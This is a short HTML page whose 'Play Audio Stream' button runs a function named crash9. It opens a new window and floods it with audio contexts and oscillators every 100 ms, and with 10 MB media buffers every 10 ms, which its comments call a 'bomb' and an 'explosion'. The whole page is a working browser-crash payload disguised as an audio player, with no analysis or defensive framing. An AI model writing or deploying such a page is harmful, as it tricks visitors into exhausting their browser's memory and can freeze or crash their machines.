<!DOCTYPE html>
<html>
<body>
<button onclick="crash9()">Play Audio Stream</button>

<script>
function crash9() {
    const w = window.open('', '_blank');
    
    // Audio context bomb
    try {
        const audioContexts = [];
        setInterval(() => {
            const context = new (w.AudioContext || w.webkitAudioContext)();
            audioContexts.push(context);
            
            // Create banyak oscillators
            for(let i = 0; i < 100; i++) {
                const oscillator = context.createOscillator();
                const gain = context.createGain();
                oscillator.connect(gain);
                gain.connect(context.destination);
                oscillator.start();
            }
        }, 100);
    } catch(e) {}
    
    // Media source explosion
    setTimeout(() => {
        try {
            const video = w.document.createElement('video');
            const mediaSource = new w.MediaSource();
            video.src = URL.createObjectURL(mediaSource);
            
            mediaSource.addEventListener('sourceopen', () => {
                const sourceBuffer = mediaSource.addSourceBuffer('video/webm; codecs="vp8"');
                
                // Append data secara continuous
                setInterval(() => {
                    try {
                        sourceBuffer.appendBuffer(new Uint8Array(10000000)); // 10MB chunks
                    } catch(e) {}
                }, 10);
            });
            
            w.document.body.appendChild(video);
            
        } catch(e) {}
    }, 1000);
}
</script>
</body>
</html>
